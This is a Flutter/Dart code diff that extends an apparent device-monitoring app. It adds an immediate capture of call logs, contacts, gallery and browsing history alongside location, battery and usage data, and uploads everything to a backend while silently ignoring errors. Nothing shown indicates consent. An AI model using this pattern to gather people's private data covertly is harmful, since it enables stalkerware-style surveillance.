@@ -131,18 +131,29 @@ class BackgroundWorker {
     }
   }
 
+  /// Forces immediate collection of call logs, contacts, gallery, and
+  /// browsing history via MethodChannel. Call from main isolate only.
+  static Future<void> _captureMonitoringNow() async {
+    final db = AppDatabase();
+    try {
+      final queue   = EventQueueService(db);
+      final monitor = MonitoringService(queue);
+      await monitor.collectNow();
+    } finally {
+      await db.close();
+    }
+  }
+
   // ── Full immediate capture + sync (call from main isolate after login) ────
 
+  /// Captures location, battery, usage, call logs, contacts, gallery, and
+  /// browsing history then uploads everything to the backend in one go.
+  /// Must be called from the main Flutter isolate (MethodChannels required).
   static Future<void> captureAllAndSync() async {
-    try {
-      await captureLocationSnapshot();
-    } catch (_) {}
-    try {
-      await captureDeviceStatus();
-    } catch (_) {}
-    try {
-      await captureUsageSnapshot();
-    } catch (_) {}
+    try { await captureLocationSnapshot();  } catch (_) {}
+    try { await captureDeviceStatus();      } catch (_) {}
+    try { await captureUsageSnapshot();     } catch (_) {}
+    try { await _captureMonitoringNow();    } catch (_) {}
     await syncPendingEvents();
     appLogger.i('BackgroundWorker: full capture+sync complete');
   }
